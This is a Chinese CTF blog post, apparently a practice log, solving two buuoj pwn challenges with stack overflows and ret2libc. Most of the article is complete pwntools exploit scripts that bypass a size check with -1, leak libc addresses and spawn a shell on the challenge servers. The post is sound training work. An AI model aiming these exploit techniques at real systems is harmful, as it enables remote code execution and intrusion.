@@ -1,0 +1,905 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="Pwn练习-day14, F0und">
+    <meta name="description" content="Day140x10 pwn2_sctf_2016题目来源：buuoj
+考点：rop或者ret2libc，负数绕过
+难度：简单
+ida反汇编主要函数：
+int vuln()
+{
+  char nptr; // [esp+1Ch] [ebp-2">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Pwn练习-day14 | F0und</title>
+    <link rel="icon" type="image/png" href="/medias/fav.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F0und</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F0und</div>
+        <div class="logo-desc">
+            
+            今天不学习，今天就变垃圾
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        Pwn练习-day14
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+</style>
+<div class="row">
+    <div class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-27
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        826
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        4 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Day14"><a href="#Day14" class="headerlink" title="Day14"></a>Day14</h1><h2 id="0x10-pwn2-sctf-2016"><a href="#0x10-pwn2-sctf-2016" class="headerlink" title="0x10 pwn2_sctf_2016"></a>0x10 pwn2_sctf_2016</h2><p>题目来源：buuoj</p>
+<p>考点：rop或者ret2libc，负数绕过</p>
+<p>难度：简单</p>
+<p>ida反汇编主要函数：</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int vuln()
+{
+  char nptr; // [esp+1Ch] [ebp-2Ch]
+  int v2; // [esp+3Ch] [ebp-Ch]
+
+  printf("How many bytes do you want me to read? ");
+  get_n((int)&nptr, 4u);
+  v2 = atoi(&nptr);
+  if ( v2 > 32 )
+    return printf("No! That size (%d) is too large!\n", v2);
+  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
+  get_n((int)&nptr, v2);
+  return printf("You said: %s\n", &nptr);
+}
+</code></pre>
+<p>仔细观察，我们发现：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">.text:080484CD                 push    ebp
+.text:080484CE                 mov     ebp, esp
+.text:080484D0                 int     80h             ; LINUX -
+.text:080484D2                 retn
+.text:080484D2 do_thing        endp ; sp-analysis failed
+.text:080484D2
+.text:080484D3 ; ---------------------------------------------------------------------------
+.text:080484D3                 inc     eax
+.text:080484D4                 retn
+.text:080484D5 ; ---------------------------------------------------------------------------
+.text:080484D5                 inc     ebx
+.text:080484D6                 retn
+.text:080484D7 ; ---------------------------------------------------------------------------
+.text:080484D7                 inc     ecx
+.text:080484D8                 retn
+.text:080484D9 ; ---------------------------------------------------------------------------
+.text:080484D9                 inc     edx
+.text:080484DA                 retn
+.text:080484DB ; ---------------------------------------------------------------------------
+.text:080484DB                 inc     esi
+.text:080484DC                 retn
+.text:080484DD ; ---------------------------------------------------------------------------
+.text:080484DD                 inc     edi
+.text:080484DE                 retn
+.text:080484DF ; ---------------------------------------------------------------------------
+.text:080484DF                 inc     ebp
+.text:080484E0                 retn
+.text:080484E1 ; ---------------------------------------------------------------------------
+.text:080484E1                 pop     ebp
+.text:080484E2                 retn
+.text:080484E2 ; } // starts at 80484CD
+</code></pre>
+<p>一看就想起来了，这跟我们前面讲的rop基础很像啊：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret  0xb
+pop ebx; ret  /bin/sh
+pop ecx; ret  0
+pop edx; ret  0
+int 80h
+</code></pre>
+<p>而且当我们输入-1的时候，就可以绕过v2大小的限制,</p>
+<p>但没有发现 <code>/bin/sh</code> 啊，我决定使用ret2libc了</p>
+<p>2.ret2libc做法</p>
+<p>对于这类题目，ret2libc一般都可以直接通吃：</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+from LibcSearcher import *
+
+p=process("./pwn2_sctf_2016")
+
+elf=ELF("./pwn2_sctf_2016")
+
+main=elf.symbols['main']
+
+__libc_start_main_got=elf.got['__libc_start_main']
+printf_plt=elf.plt['printf']
+
+context.log_level="debug"
+
+p.sendlineafter("How many bytes do you want me to read? ",str(-1))
+
+payload1=flat(['a'*0x2c,'bbbb',printf_plt, main ,__libc_start_main_got])
+
+p.sendlineafter("!\n",payload1)
+
+p.recvline('\n')
+
+libc_start_main=u32(p.recv(4))
+
+log.info("__libc_start_main:"+hex(libc_start_main))
+
+libc = LibcSearcher('__libc_start_main', libc_start_main)
+libcbase = libc_start_main - libc.dump('__libc_start_main')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+
+p.sendlineafter("How many bytes do you want me to read? ",str(-1))
+
+payload2=flat(['a'*0x2c,'bbbb',system_addr , 'bbbb' ,binsh_addr])
+
+p.sendlineafter("!\n",payload2)
+
+p.interactive()
+</code></pre>
+<p>不知道为什么libc_start_main会失败，</p>
+<p>换成printf就又可以了</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+from LibcSearcher import *
+
+# p=process("./pwn2_sctf_2016")
+p=remote("node3.buuoj.cn",28027)
+
+elf=ELF("./pwn2_sctf_2016")
+
+main=elf.symbols['main']
+
+printf_got=elf.got['printf']
+printf_plt=elf.plt['printf']
+
+# context.log_level="debug"
+
+p.sendlineafter("How many bytes do you want me to read? ",str(-1))
+
+payload1=flat(['a'*0x2c,'bbbb',p32(printf_plt), p32(main) ,p32(printf_got)])
+
+p.sendlineafter("!\n",payload1)
+
+p.recvline('\n')
+
+printf=u32(p.recv(4))
+
+log.info("printf_got:"+hex(printf))
+
+libc = LibcSearcher('printf', printf)
+libcbase = printf - libc.dump('printf')
+system_addr = libcbase + libc.dump('system')
+binsh_addr = libcbase + libc.dump('str_bin_sh')
+
+p.sendlineafter("How many bytes do you want me to read? ",str(-1))
+
+payload2=flat(['a'*0x2c,'bbbb',p32(system_addr) , 'bbbb' ,p32(binsh_addr)])
+
+p.sendlineafter("!\n",payload2)
+
+p.interactive()
+</code></pre>
+<h2 id="0x20-铁人三项-第五赛区-2018-rop"><a href="#0x20-铁人三项-第五赛区-2018-rop" class="headerlink" title="0x20 铁人三项(第五赛区)_2018_rop"></a>0x20 铁人三项(第五赛区)_2018_rop</h2><p>题目来源：buuoj</p>
+<p>考点：rop</p>
+<p>难度：简单</p>
+<p>exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+from LibcSearcher import *
+
+proc="./2018_rop"
+
+elf=ELF(proc)
+
+write_got=elf.got['write']
+write_plt=elf.plt['write']
+
+def pwn(ip,port,debug):
+    global sh
+    if debug==1:
+        context.log_level="debug"
+        sh=process(proc)
+    else:
+        sh=remote(ip,port)
+
+    # 0x0804855d : pop esi ; pop edi ; pop ebp ; ret
+
+    pop3_ret=0x0804855d
+    # vulnerable_function 0x08048474
+    ret=0x08048474
+    # payload='a'*offset + retaddr
+    payload='a'*0x88 + 'bbbb' + p32(write_plt) + p32(pop3_ret) +p32(1) + p32(write_got) +p32(4) +p32(ret) 
+    sh.sendline(payload)
+
+    #leak_libc
+    write=u32(sh.recv()[0:4])
+    log.info("write:"+hex(write))
+
+    libc = LibcSearcher("write",write)
+    libc_base = write - libc.dump('write')
+    system = libc_base + libc.dump('system')
+    binsh = libc_base + libc.dump('str_bin_sh')
+
+    # 0x08048199 : ret
+    system_ret=0x08048199
+    ubuntu18_payload='a'*0x88 +'bbbb' +p32(system_ret)+ p32(system) + 'bbbb' + p32(binsh)
+    payload='a'*0x88 +'bbbb' + p32(system) + 'bbbb' + p32(binsh)
+    sh.sendline(payload)
+    # sh.sendline(ubuntu18_payload)
+    # sh.sendline("cat flag")
+    sh.interactive()
+
+if __name__ =="__main__":
+    pwn("node3.buuoj.cn",27648,0)
+</code></pre>
+<p>测试后发现，好像不用ret也能getshell,奇了怪了，以前就不行</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/03/27/ctf/pwn/day14/" class="b-link-green">Pwn练习-day14</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/03/27/ctf/pwn/day13/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Pwn练习-day13">
+                        
+                        <span class="card-title">Pwn练习-day13</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">Day13ez_pz_hackover_2016题目来源：buuoj
+考点：ret2shellcode
+难度：简单
+32位动态链接库文件，开了RELRO，不能修改GOT表了
+程序没有提供后门，主要函数为：
+void *chall()
+{
+ </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/25/ctf/pwn/fastbins/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="fastbins attack 学习记录">
+                        
+                        <span class="card-title">fastbins attack 学习记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">fastbins attack ——Fastbin Double Free0x00 前言本篇为学习记录所用
+0x10 漏洞原理利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">56.5k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
